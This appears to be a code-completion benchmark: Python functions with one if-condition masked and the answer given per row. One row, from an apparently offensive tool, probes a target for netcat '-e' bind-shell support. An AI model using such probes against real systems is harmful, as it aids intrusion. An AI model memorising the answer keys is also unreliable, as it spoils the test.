2403,"def pluginload(bot, event, *args):<tab>""""""loads a previously unloaded plugin, requires plugins. prefix""""""<tab>if args:<tab><tab>module_path = args[0]<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>message = ""<b><pre>{}</pre>: loaded</b>"".format(module_path)<tab><tab><tab>else:<tab><tab><tab><tab>message = ""<b><pre>{}</pre>: failed</b>"".format(module_path)<tab><tab>except RuntimeError as e:<tab><tab><tab>message = ""<b><pre>{}</pre>: <pre>{}</pre></b>"".format(module_path, str(e))<tab>else:<tab><tab>message = ""<b>module path required</b>""<tab>yield from bot.coro_send_message(event.conv_id, message)","if plugins . load ( bot , module_path ) :",192
2404,"def validate_prompt_lb(hostname):<tab># Run the standard hostname check first:<tab>hostname = validate_prompt_hostname(hostname)<tab># Make sure this host wasn't already specified:<tab>for host in hosts:<tab><tab><IF-STMT><tab><tab><tab>raise click.BadParameter(<tab><tab><tab><tab>'Cannot re-use ""%s"" as a load balancer, '<tab><tab><tab><tab>""please specify a separate host"" % hostname<tab><tab><tab>)<tab>return hostname",if host . connect_to == hostname and ( host . is_master ( ) or host . is_node ( ) ) :,129
2405,"def alter_inventory(session, resource, amount):<tab>""""""Alters the inventory of each settlement.""""""<tab># NOTE avoid circular import<tab>from horizons.component.storagecomponent import StorageComponent<tab>for settlement in session.world.settlements:<tab><tab><IF-STMT><tab><tab><tab>settlement.warehouse.get_component(StorageComponent).inventory.alter(<tab><tab><tab><tab>resource, amount<tab><tab><tab>)",if settlement . owner == session . world . player and settlement . warehouse :,109
2406,"def _(value):<tab>if kb.customInjectionMark in (value or """"):<tab><tab><IF-STMT><tab><tab><tab>value = value.replace(kb.customInjectionMark, """")<tab><tab>else:<tab><tab><tab>value = re.sub(r""\w*%s"" % re.escape(kb.customInjectionMark), payload, value)<tab>return value",if payload is None :,86
2407,"def __call__(self, target):<tab>if ""weights"" not in target.temp:<tab><tab>return True<tab>targets = target.temp[""weights""]<tab>for cname in target.children:<tab><tab>if cname in targets:<tab><tab><tab>c = target.children[cname]<tab><tab><tab>deviation = abs((c.weight - targets[cname]) / targets[cname])<tab><tab><tab>if deviation > self.tolerance:<tab><tab><tab><tab>return True<tab>if ""cash"" in target.temp:<tab><tab>cash_deviation = abs(<tab><tab><tab>(target.capital - targets.value) / targets.value - target.temp[""cash""]<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return True<tab>return False",if cash_deviation > self . tolerance :,178
2408,"def splitroot(self, part, sep=sep):<tab>if part and part[0] == sep:<tab><tab>stripped_part = part.lstrip(sep)<tab><tab># According to POSIX path resolution:<tab><tab># http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap04.html#tag_04_11<tab><tab># ""A pathname that begins with two successive slashes may be<tab><tab># interpreted in an implementation-defined manner, although more<tab><tab># than two leading slashes shall be treated as a single slash"".<tab><tab><IF-STMT><tab><tab><tab>return """", sep * 2, stripped_part<tab><tab>else:<tab><tab><tab>return """", sep, stripped_part<tab>else:<tab><tab>return """", """", part",if len ( part ) - len ( stripped_part ) == 2 :,190
2409,"def _Determine_Do(self):<tab>self.applicable = 1<tab>method = ""moz-src""<tab>method_arg = None<tab>for opt, optarg in self.chosenOptions:<tab><tab><IF-STMT><tab><tab><tab>method = ""moz-src""<tab><tab>elif opt == ""--moz-objdir"":<tab><tab><tab>method = ""moz-objdir""<tab><tab><tab>method_arg = optarg<tab>if method == ""moz-src"":<tab><tab>self.value = self._get_mozilla_objdir()<tab>elif method == ""moz-objdir"":<tab><tab>self.value = self._use_mozilla_objdir(method_arg)<tab>else:<tab><tab>raise black.configure.ConfigureError(""bogus method: %r"" % method)<tab>self.determined = 1","if opt == ""--moz-src"" :",188
2410,"def is_filtered_inherited_member(name: str, obj: Any) -> bool:<tab>if inspect.isclass(self.object):<tab><tab>for cls in self.object.__mro__:<tab><tab><tab>if cls.__name__ == self.options.inherited_members and cls != self.object:<tab><tab><tab><tab># given member is a member of specified *super class*<tab><tab><tab><tab>return True<tab><tab><tab>elif name in cls.__dict__:<tab><tab><tab><tab>return False<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab><tab>elif isinstance(obj, ObjectMember) and obj.class_ is cls:<tab><tab><tab><tab>return False<tab>return False","elif name in self . get_attr ( cls , ""__annotations__"" , { } ) :",167
2411,"def _remove_all_greasemonkey_scripts(self):<tab>page_scripts = self._widget.page().scripts()<tab>for script in page_scripts.toList():<tab><tab><IF-STMT><tab><tab><tab>log.greasemonkey.debug(""Removing script: {}"".format(script.name()))<tab><tab><tab>removed = page_scripts.remove(script)<tab><tab><tab>assert removed, script.name()","if script . name ( ) . startswith ( ""GM-"" ) :",100
2412,"def merge_intervals(intervals):<tab>""""""Merge intervals in the form of a list.""""""<tab>if intervals is None:<tab><tab>return None<tab>intervals.sort(key=lambda i: i[0])<tab>out = [intervals.pop(0)]<tab>for i in intervals:<tab><tab><IF-STMT><tab><tab><tab>out[-1][-1] = max(out[-1][-1], i[-1])<tab><tab>else:<tab><tab><tab>out.append(i)<tab>return out",if out [ - 1 ] [ - 1 ] >= i [ 0 ] :,122
2413,"def __setattr__(self, key, val):<tab>self.__dict__[key] = val<tab>self.__dict__[key.upper()] = val<tab>levels = key.split(""."")<tab>last_level = len(levels) - 1<tab>pointer = self._pointer<tab>if len(levels) > 1:<tab><tab>for i, l in enumerate(levels):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>setattr(getattr(self, l), ""."".join(levels[i:]), val)<tab><tab><tab>if l == last_level:<tab><tab><tab><tab>pointer[l] = val<tab><tab><tab>else:<tab><tab><tab><tab>pointer = pointer[l]","if hasattr ( self , l ) and isinstance ( getattr ( self , l ) , Config ) :",165
2414,"def get_menu_title(self):<tab>handle = self.obj.get_handle()<tab>if handle:<tab><tab>who = get_participant_from_event(self.db, handle)<tab><tab>desc = self.obj.get_description()<tab><tab>event_name = self.obj.get_type()<tab><tab><IF-STMT><tab><tab><tab>event_name = ""%s - %s"" % (event_name, desc)<tab><tab>if who:<tab><tab><tab>event_name = ""%s - %s"" % (event_name, who)<tab><tab>dialog_title = _(""Event: %s"") % event_name<tab>else:<tab><tab>dialog_title = _(""New Event"")<tab>return dialog_title",if desc :,168
2415,"def perform_initialization(m):<tab>if isinstance(m, self.initialize_layers):<tab><tab><IF-STMT><tab><tab><tab>initialization_method(m.weight.data, **initialization_kwargs)<tab><tab>if (<tab><tab><tab>m.bias is not None<tab><tab><tab>and self.initialize_bias != ""No""<tab><tab><tab>and initialization_method_bias is not None<tab><tab>):<tab><tab><tab>try:<tab><tab><tab><tab>initialization_method_bias(m.bias.data, **initialization_kwargs_bias)<tab><tab><tab>except ValueError:<tab><tab><tab><tab>pass",if initialization_method is not None :,145
2416,"def forward(self, inputs):<tab>x = inputs[""image""]<tab>out = self.conv0(x)<tab>out = self.downsample0(out)<tab>blocks = []<tab>for i, conv_block_i in enumerate(self.darknet_conv_block_list):<tab><tab>out = conv_block_i(out)<tab><tab>if i == self.freeze_at:<tab><tab><tab>out.stop_gradient = True<tab><tab><IF-STMT><tab><tab><tab>blocks.append(out)<tab><tab>if i < self.num_stages - 1:<tab><tab><tab>out = self.downsample_list[i](out)<tab>return blocks",if i in self . return_idx :,159
2417,"def _urlvars__set(self, value):<tab>environ = self.environ<tab>if ""wsgiorg.routing_args"" in environ:<tab><tab>environ[""wsgiorg.routing_args""] = (environ[""wsgiorg.routing_args""][0], value)<tab><tab><IF-STMT><tab><tab><tab>del environ[""paste.urlvars""]<tab>elif ""paste.urlvars"" in environ:<tab><tab>environ[""paste.urlvars""] = value<tab>else:<tab><tab>environ[""wsgiorg.routing_args""] = ((), value)","if ""paste.urlvars"" in environ :",134
2418,"def forward(self, x, activate=True, norm=True):<tab>for layer in self.order:<tab><tab>if layer == ""conv"":<tab><tab><tab>if self.with_explicit_padding:<tab><tab><tab><tab>x = self.padding_layer(x)<tab><tab><tab>x = self.conv(x)<tab><tab>elif layer == ""norm"" and norm and self.with_norm:<tab><tab><tab>x = self.norm(x)<tab><tab><IF-STMT><tab><tab><tab>x = self.activate(x)<tab>return x","elif layer == ""act"" and activate and self . with_activation :",138
2419,"def add(self, entry):<tab>if not self._find_entry(entry, filters=False):<tab><tab>show = self.add_show(entry)<tab><tab><IF-STMT><tab><tab><tab>self._shows = None<tab><tab><tab>log.verbose(""Successfully added show %s to Sonarr"", show[""title""])<tab>else:<tab><tab>log.debug(""entry %s already exists in Sonarr list"", entry)",if show :,99
2420,"def __eq__(self, other):<tab>if not isinstance(other, Result):<tab><tab>return False<tab>equal = self.info == other.info<tab>equal &= self.stats == other.stats<tab>equal &= self.trajectories == other.trajectories<tab>for k in self.np_arrays:<tab><tab>if k not in other.np_arrays:<tab><tab><tab>equal &= False<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>equal &= all([np.array_equal(self.np_arrays[k], other.np_arrays[k])])<tab>return equal",if not equal :,138
2421,"def handle_server_api(output, kwargs):<tab>""""""Special handler for API-call 'set_config' [servers]""""""<tab>name = kwargs.get(""keyword"")<tab>if not name:<tab><tab>name = kwargs.get(""name"")<tab>if name:<tab><tab>server = config.get_config(""servers"", name)<tab><tab><IF-STMT><tab><tab><tab>server.set_dict(kwargs)<tab><tab><tab>old_name = name<tab><tab>else:<tab><tab><tab>config.ConfigServer(name, kwargs)<tab><tab><tab>old_name = None<tab><tab>sabnzbd.Downloader.update_server(old_name, name)<tab>return name",if server :,155
2422,"def extractNames(self, names):<tab>offset = names[""offset""].value<tab>for header in names.array(""header""):<tab><tab>key = header[""nameID""].value<tab><tab>foffset = offset + header[""offset""].value<tab><tab>field = names.getFieldByAddress(foffset * 8)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>value = field.value<tab><tab>if key not in self.NAMEID_TO_ATTR:<tab><tab><tab>continue<tab><tab>key = self.NAMEID_TO_ATTR[key]<tab><tab>if key == ""version"" and value.startswith(u""Version ""):<tab><tab><tab># ""Version 1.2"" => ""1.2""<tab><tab><tab>value = value[8:]<tab><tab>setattr(self, key, value)",if not field or not isString ( field ) :,189
2423,"def api_read(self):<tab>files = []<tab>files.append(""/bin/netcat"")<tab>files.append(""/etc/alternative/netcat"")<tab>files.append(""/bin/nc"")<tab>#<tab> init variables<tab>installed = False<tab>support = False<tab>path = None<tab>for _file in files:<tab><tab>file_content = self.shell.read(_file)<tab><tab>if file_content:<tab><tab><tab>installed = True<tab><tab><tab>path = _file<tab><tab><tab><IF-STMT><tab><tab><tab><tab>support = True<tab><tab><tab>break<tab>result = {<tab><tab>""netcat_installed"": installed,<tab><tab>""supports_shell_bind"": support,<tab><tab>""path"": path,<tab>}<tab>return result","if ""-e filename"" in file_content :",187
2424,"def _get_iscsi_portal(self, netspace):<tab>for netpsace_interface in netspace.get_ips():<tab><tab><IF-STMT><tab><tab><tab>port = netspace.get_properties().iscsi_tcp_port<tab><tab><tab>return ""%s:%s"" % (netpsace_interface.ip_address, port)<tab># if we get here it means there are no enabled ports<tab>msg = _(""No available interfaces in iSCSI network space %s"") % netspace.get_name()<tab>raise exception.VolumeDriverException(message=msg)",if netpsace_interface . enabled :,140
2425,"def show(self):<tab>if len(self.figures.keys()) == 0:<tab><tab>return<tab>if not SETTINGS.plot_split:<tab><tab>if SETTINGS.plot_backend.lower() == ""qt4agg"":<tab><tab><tab>self.tabbed_qt4_window()<tab><tab>elif SETTINGS.plot_backend.lower() == ""qt5agg"":<tab><tab><tab>self.tabbed_qt5_window()<tab><tab><IF-STMT><tab><tab><tab>self.tabbed_tk_window()<tab><tab>else:<tab><tab><tab>plt.show()<tab>else:<tab><tab>plt.show()","elif SETTINGS . plot_backend . lower ( ) == ""tkagg"" :",161
2426,"def _update_decommissioned_icon(self):<tab>""""""Add or remove decommissioned icon.""""""<tab>if not self.instance.has_status_icon:<tab><tab>return<tab>if self.is_active() is not self.__active:<tab><tab>self.__active = not self.__active<tab><tab><IF-STMT><tab><tab><tab>RemoveStatusIcon.broadcast(self, self.instance, DecommissionedStatus)<tab><tab>else:<tab><tab><tab>self._add_status_icon(DecommissionedStatus(self.instance))",if self . __active :,127
2427,"def _count(self, element, count=True):<tab>if not isinstance(element, six.string_types):<tab><tab>if self == element:<tab><tab><tab>return 1<tab>i = 0<tab>for child in self.children:<tab><tab># child is text content and element is also text content, then<tab><tab># make a simple ""text"" in ""text""<tab><tab><IF-STMT><tab><tab><tab>if isinstance(element, six.string_types):<tab><tab><tab><tab>if count:<tab><tab><tab><tab><tab>i += child.count(element)<tab><tab><tab><tab>elif element in child:<tab><tab><tab><tab><tab>return 1<tab><tab>else:<tab><tab><tab>i += child._count(element, count=count)<tab><tab><tab>if not count and i:<tab><tab><tab><tab>return i<tab>return i","if isinstance ( child , six . string_types ) :",196
2428,"def test_read_lazy(self):<tab>want = b""x"" * 100<tab>telnet = test_telnet([want])<tab>self.assertEqual(b"""", telnet.read_lazy())<tab>data = b""""<tab>while True:<tab><tab>try:<tab><tab><tab>read_data = telnet.read_lazy()<tab><tab><tab>data += read_data<tab><tab><tab><IF-STMT><tab><tab><tab><tab>telnet.fill_rawq()<tab><tab>except EOFError:<tab><tab><tab>break<tab><tab>self.assertTrue(want.startswith(data))<tab>self.assertEqual(data, want)",if not read_data :,143
2429,"def getprefs(path=PREFSFILENAME):<tab>if not os.path.exists(path):<tab><tab>f = open(path, ""w"")<tab><tab>f.write(default_prefs)<tab><tab>f.close()<tab>f = open(path)<tab>lines = f.readlines()<tab>prefs = {}<tab>for line in lines:<tab><tab><IF-STMT><tab><tab><tab>line = line[:-1]<tab><tab>try:<tab><tab><tab>name, value = re.split("":"", line, 1)<tab><tab><tab>prefs[string.strip(name)] = eval(value)<tab><tab>except:<tab><tab><tab>pass<tab>return prefs","if line [ - 1 : ] == ""\n"" :",155
2430,"def connect(self):<tab>while True:<tab><tab>errno = self.sock.connect_ex(self.addr)<tab><tab><IF-STMT><tab><tab><tab># connected immediately.<tab><tab><tab>break<tab><tab>elif errno == EINPROGRESS:<tab><tab><tab># will be connected.<tab><tab><tab>break<tab><tab>elif errno == ENOENT:<tab><tab><tab># no such socket file.<tab><tab><tab>self.create_connection(self.failover_interval)<tab><tab><tab>return<tab><tab>else:<tab><tab><tab>raise ValueError(""Unexpected socket errno: %d"" % errno)<tab>self.event_loop.watch_file(self.sock.fileno(), self.handle)",if not errno :,157
2431,"def set_enabled_addons(file_path, addons, comment=None):<tab>with codecs.open(file_path, ""w"", ""utf-8"") as f:<tab><tab><IF-STMT><tab><tab><tab>f.write(""# %s\n\n"" % comment)<tab><tab>for addon in addons:<tab><tab><tab>f.write(""%s\n"" % addon)",if comment :,91
2432,"def check_interfaceinNetWorkManager(self, interface):<tab>""""""check if interface is already in file config""""""<tab>mac = Refactor.get_interface_mac(interface)<tab>if mac != None:<tab><tab>if mac in open(self.mn_path, ""r"").read():<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return True<tab>return False","if interface in open ( self . mn_path , ""r"" ) . read ( ) :",102
2433,"def spaceless(writer, node):<tab>original = writer.spaceless<tab>writer.spaceless = True<tab>writer.warn(""entering spaceless mode with different semantics"", node)<tab># do the initial stripping<tab>nodelist = list(node.nodelist)<tab>if nodelist:<tab><tab><IF-STMT><tab><tab><tab>nodelist[0] = TextNode(nodelist[0].s.lstrip())<tab><tab>if isinstance(nodelist[-1], TextNode):<tab><tab><tab>nodelist[-1] = TextNode(nodelist[-1].s.rstrip())<tab>writer.body(nodelist)<tab>writer.spaceless = original","if isinstance ( nodelist [ 0 ] , TextNode ) :",146
2434,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_app_id(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_queue_name(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_pause(d.getBoolean())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,152
2435,"def group_re(self):<tab>""""""Return a regexp pattern with named groups""""""<tab>out = """"<tab>for token, data in self.tokens():<tab><tab>if token == ""TXT"":<tab><tab><tab>out += re.escape(data)<tab><tab><IF-STMT><tab><tab><tab>out += ""(?P<%s>%s)"" % (data[1], data[0])<tab><tab>elif token == ""ANON"":<tab><tab><tab>out += ""(?:%s)"" % data<tab>return out","elif token == ""VAR"" :",114
2436,"def wrap_in(input):<tab>if isinstance(input, (SymbolicInput)):<tab><tab>return input<tab>elif isinstance(input, gof.Variable):<tab><tab># r -> SymbolicInput(variable=r)<tab><tab>return SymbolicInput(input)<tab>elif isinstance(input, (list, tuple)):<tab><tab># (r, u) -> SymbolicInput(variable=r, update=u)<tab><tab><IF-STMT><tab><tab><tab>return SymbolicInput(input[0], update=input[1])<tab><tab>else:<tab><tab><tab>raise TypeError(""Expected two elements in the list or tuple."", input)<tab>else:<tab><tab>raise TypeError(<tab><tab><tab>""Unknown input type: %s (%s), expected Variable "" ""instance"",<tab><tab><tab>type(input),<tab><tab><tab>input,<tab><tab>)",if len ( input ) == 2 :,195
2437,"def _remove_event(self, event):<tab># Find event according to its timestamp.<tab># Index returned should be one behind.<tab>i = bisect.bisect(self._eventq, event)<tab># Having two events with identical timestamp is unlikely but possible.<tab># I am going to move forward and compare timestamp AND object address<tab># to make sure the correct object is found.<tab>while i > 0:<tab><tab>i -= 1<tab><tab>e = self._eventq[i]<tab><tab><IF-STMT><tab><tab><tab>raise exception.EventNotFound(event)<tab><tab>elif id(e) == id(event):<tab><tab><tab>self._eventq.pop(i)<tab><tab><tab>return<tab>raise exception.EventNotFound(event)",if e . timestamp != event . timestamp :,177
2438,"def cron_starter(*args: Any) -> None:<tab>_tz = self.conf.timezone if timezone is None else timezone<tab>while not self.should_stop:<tab><tab>await self.sleep(cron.secs_for_next(cron_format, _tz))<tab><tab>if not self.should_stop:<tab><tab><tab>should_run = not on_leader or self.is_leader()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>with self.trace(shortlabel(fun), trace_enabled=traced):<tab><tab><tab><tab><tab>await fun(*args)",if should_run :,139
2439,"def _find_boundary(self):<tab>ct_info = tuple(x.strip() for x in self.content_type.split("";""))<tab>mimetype = ct_info[0]<tab>if mimetype.split(""/"")[0].lower() != ""multipart"":<tab><tab>raise NonMultipartContentTypeException(<tab><tab><tab>""Unexpected mimetype in content-type: '{0}'"".format(mimetype)<tab><tab>)<tab>for item in ct_info[1:]:<tab><tab>attr, value = _split_on_find(item, ""="")<tab><tab><IF-STMT><tab><tab><tab>self.boundary = encode_with(value.strip('""'), self.encoding)","if attr . lower ( ) == ""boundary"" :",151
2440,"def get_kwarg_or_param(request, kwargs, key):<tab>value = None<tab>try:<tab><tab>value = kwargs[key]<tab>except KeyError:<tab><tab>if request.method == ""GET"":<tab><tab><tab>value = request.GET.get(key)<tab><tab><IF-STMT><tab><tab><tab>value = request.POST.get(key)<tab>return value","elif request . method == ""POST"" :",93
2441,"def _gather_async_results(self, result: Result, source: typing.Any) -> None:<tab>try:<tab><tab>context = result[""context""]<tab><tab>context[""is_refresh""] = False<tab><tab>context[""vars""] = self._vim.vars<tab><tab>async_candidates = source.gather_candidates(context)<tab><tab>context[""vars""] = None<tab><tab>result[""is_async""] = context[""is_async""]<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>context[""candidates""] += convert2candidates(async_candidates)<tab>except Exception as exc:<tab><tab>self._handle_source_exception(source, exc)",if async_candidates is None :,155
2442,"def _check_session(self, session, action):<tab>if session is None:<tab><tab><IF-STMT><tab><tab><tab>key = self[0].key<tab><tab>else:<tab><tab><tab>key = self.key<tab><tab>raise ValueError(<tab><tab><tab>f""Tileable object {key} must be executed first before {action}""<tab><tab>)","if isinstance ( self , tuple ) :",84
2443,"def update(self, dict=None, **kwargs):<tab>if self._pending_removals:<tab><tab>self._commit_removals()<tab>d = self.data<tab>if dict is not None:<tab><tab><IF-STMT><tab><tab><tab>dict = type({})(dict)<tab><tab>for key, o in dict.items():<tab><tab><tab>d[key] = KeyedRef(o, self._remove, key)<tab>if len(kwargs):<tab><tab>self.update(kwargs)","if not hasattr ( dict , ""items"" ) :",121
2444,"def get_sigma(self):<tab>if self.wants_automatic_sigma.value:<tab><tab>#<tab><tab># Constants here taken from FindEdges.m<tab><tab>#<tab><tab>if self.method == M_CANNY:<tab><tab><tab>return 1.0<tab><tab><IF-STMT><tab><tab><tab>return 2.0<tab><tab>else:<tab><tab><tab>raise NotImplementedError(<tab><tab><tab><tab>""Automatic sigma not supported for method %s."" % self.method.value<tab><tab><tab>)<tab>else:<tab><tab>return self.sigma.value",elif self . method == M_LOG :,136
2445,"def forward(self, x, activate=True, norm=True):<tab>for layer in self.order:<tab><tab><IF-STMT><tab><tab><tab>if self.with_explicit_padding:<tab><tab><tab><tab>x = self.padding_layer(x)<tab><tab><tab>x = self.conv(x)<tab><tab>elif layer == ""norm"" and norm and self.with_norm:<tab><tab><tab>x = self.norm(x)<tab><tab>elif layer == ""act"" and activate and self.with_activation:<tab><tab><tab>x = self.activate(x)<tab>return x","if layer == ""conv"" :",138
2446,"def _grouping_intervals(grouping):<tab>last_interval = None<tab>for interval in grouping:<tab><tab># if grouping is -1, we are done<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab># 0: re-use last group ad infinitum<tab><tab>if interval == 0:<tab><tab><tab>if last_interval is None:<tab><tab><tab><tab>raise ValueError(""invalid grouping"")<tab><tab><tab>while True:<tab><tab><tab><tab>yield last_interval<tab><tab>yield interval<tab><tab>last_interval = interval",if interval == CHAR_MAX :,124
2447,"def iterRelativeExportCFiles(basepath):<tab>for root, dirs, files in os.walk(basepath, topdown=True):<tab><tab>for directory in dirs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>dirs.remove(directory)<tab><tab>for filename in files:<tab><tab><tab>if not isExportCFileIgnored(filename):<tab><tab><tab><tab>fullpath = os.path.join(root, filename)<tab><tab><tab><tab>yield os.path.relpath(fullpath, basepath)",if isAddonDirectoryIgnored ( directory ) :,117
2448,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.add_application_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_tag(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,122
2449,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.set_format(d.getVarInt32())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_path(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,120
2450,"def _get_future_trading_minutes(self, trading_date):<tab>trading_minutes = set()<tab>universe = self._get_universe()<tab>for order_book_id in universe:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>trading_minutes.update(<tab><tab><tab>self._env.data_proxy.get_trading_minutes_for(order_book_id, trading_date)<tab><tab>)<tab>return set([convert_int_to_datetime(minute) for minute in trading_minutes])",if self . _env . get_account_type ( order_book_id ) == DEFAULT_ACCOUNT_TYPE . STOCK :,154
2451,"def helper(chunk: Any) -> Any:<tab>nonlocal counter<tab>if not isinstance(chunk, dict):<tab><tab>return chunk<tab>if len(chunk) <= 2:<tab><tab>return chunk<tab>id = hash(str(chunk))<tab>if id in cache:<tab><tab>return cache[id]<tab>else:<tab><tab>cache[id] = {"".id"": counter}<tab><tab>chunk["".cache_id""] = counter<tab><tab>counter += 1<tab>for name in sorted(chunk.keys()):<tab><tab>value = chunk[name]<tab><tab><IF-STMT><tab><tab><tab>chunk[name] = [helper(child) for child in value]<tab><tab>elif isinstance(value, dict):<tab><tab><tab>chunk[name] = helper(value)<tab>return chunk","if isinstance ( value , list ) :",180
2452,"def _render_lang_List(self, element):<tab>with self.buffer.foldable_lines():<tab><tab>self.buffer.write(""["", style=self.styles.bracket)<tab><tab>item_count = len(element.items)<tab><tab>if item_count:<tab><tab><tab>with self.buffer.indent():<tab><tab><tab><tab>for idx, item in enumerate(element.items):<tab><tab><tab><tab><tab>self._render(item)<tab><tab><tab><tab><tab>if idx < (item_count - 1):<tab><tab><tab><tab><tab><tab>self.buffer.write("","")<tab><tab><tab><tab><tab><tab>self.buffer.mark_line_break()<tab><tab><IF-STMT><tab><tab><tab>self.buffer.write(""..."")<tab><tab>self.buffer.write(""]"", style=self.styles.bracket)",if element . trimmed :,183
2453,"def test_parse_query_params_matchable_field(self):<tab>query_params = {<tab><tab>""filter[string_field][contains]"": ""foo"",<tab><tab>""filter[string_field][icontains]"": ""bar"",<tab>}<tab>fields = self.view.parse_query_params(query_params)<tab>for key, field_name in fields.items():<tab><tab>if field_name[""string_field""][""op""] == ""contains"":<tab><tab><tab>assert_equal(field_name[""string_field""][""value""], ""foo"")<tab><tab><IF-STMT><tab><tab><tab>assert_equal(field_name[""string_field""][""value""], ""bar"")<tab><tab>else:<tab><tab><tab>self.fail()","elif field_name [ ""string_field"" ] [ ""op"" ] == ""icontains"" :",179
2454,"def on_www_authenticate(data=None):<tab>io_loop.remove_timeout(timeout[0])<tab>if data:<tab><tab>scheme = re.findall(""WWW-Authenticate: ([^\s]+)"", data)[0].strip()<tab><tab>logging.debug(""rtsp netcam auth scheme: %s"" % scheme)<tab><tab><IF-STMT><tab><tab><tab>send_auth[0] = True<tab><tab><tab>connect()<tab><tab>else:<tab><tab><tab>logging.debug(<tab><tab><tab><tab>""rtsp auth scheme digest not supported, considering credentials ok""<tab><tab><tab>)<tab><tab><tab>handle_success(""(unknown) "")<tab>else:<tab><tab>logging.error(""timeout waiting for rtsp auth scheme"")<tab><tab>handle_error(""timeout waiting for rtsp netcam response"")","if scheme . lower ( ) == ""basic"" :",186
2455,"def receive(debug=debug):<tab>if should_shutdown and should_shutdown():<tab><tab>debug(""worker got sentinel -- exiting"")<tab><tab>raise SystemExit(EX_OK)<tab>try:<tab><tab>ready, req = _receive(1.0)<tab><tab><IF-STMT><tab><tab><tab>return None<tab>except (EOFError, IOError) as exc:<tab><tab>if get_errno(exc) == errno.EINTR:<tab><tab><tab>return None  # interrupted, maybe by gdb<tab><tab>debug(""worker got %s -- exiting"", type(exc).__name__)<tab><tab>raise SystemExit(EX_FAILURE)<tab>if req is None:<tab><tab>debug(""worker got sentinel -- exiting"")<tab><tab>raise SystemExit(EX_FAILURE)<tab>return req",if not ready :,173
2456,"def test_all(self):<tab>raw = [r for r in self.map._revision_map.values() if r is not None]<tab>revs = [rev for rev in self.map.iterate_revisions(""heads"", ""base"")]<tab>eq_(set(raw), set(revs))<tab>for idx, rev in enumerate(revs):<tab><tab>ancestors = set(self.map._get_ancestor_nodes([rev])).difference([rev])<tab><tab>descendants = set(self.map._get_descendant_nodes([rev])).difference([rev])<tab><tab>assert not ancestors.intersection(descendants)<tab><tab>remaining = set(revs[idx + 1 :])<tab><tab><IF-STMT><tab><tab><tab>assert remaining.intersection(ancestors)",if remaining :,165
2457,"def is_issue(self, node):<tab>first = node.children[0]<tab>if first.type == ""string"" and self._normalizer.version >= (3, 0):<tab><tab>first_is_bytes = self._is_bytes_literal(first)<tab><tab>for string in node.children[1:]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True",if first_is_bytes != self . _is_bytes_literal ( string ) :,101
2458,"def elements(registry):<tab>""""""Given a resource registry return sorted de-aliased values.""""""<tab>seen = {}<tab>for k, v in registry.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if v in seen:<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>seen[ElementSchema.name(v)] = v<tab>return [seen[k] for k in sorted(seen)]","if k in ( ""and"" , ""or"" , ""not"" ) :",105
2459,"def make_pattern(wtree):<tab>subpattern = []<tab>for part in wtree[1:-1]:<tab><tab>if isinstance(part, list):<tab><tab><tab>part = make_pattern(part)<tab><tab>elif wtree[0] != """":<tab><tab><tab>for c in part:<tab><tab><tab><tab># Meta-characters cannot be quoted<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise GlobError()<tab><tab>subpattern.append(part)<tab>return """".join(subpattern)",if c in special_chars :,123
2460,"def check_if_list_contain_duplicates(item: list, depth: int) -> None:<tab>try:<tab><tab>if len(item) != len(set(item)):<tab><tab><tab>print(Fore.RED + ""Rule {} has duplicate filters"".format(file))<tab><tab><tab>files_with_duplicate_filters.append(file)<tab>except:<tab><tab># unhashable types like dictionaries<tab><tab>for sub_item in item:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>check_list_or_recurse_on_dict(sub_item, depth + 1)",if type ( sub_item ) == dict and depth <= MAX_DEPTH :,148
2461,"def PrintHighlighted(self, out):<tab>from doctools import make_help<tab>pos = self.start_pos<tab>for line_end in Lines(self.s, self.start_pos, self.end_pos):<tab><tab># NOTE: HighlightLine accepts an HTML ESCAPED line.  It's valid to just<tab><tab># add tags and leave everything alone.<tab><tab>line = self.s[pos:line_end]<tab><tab>html_line = make_help.HighlightLine(self.lang, line)<tab><tab><IF-STMT><tab><tab><tab>out.PrintUntil(pos)<tab><tab><tab>out.Print(html_line)<tab><tab><tab>out.SkipTo(line_end)<tab><tab>pos = line_end",if html_line is not None :,179
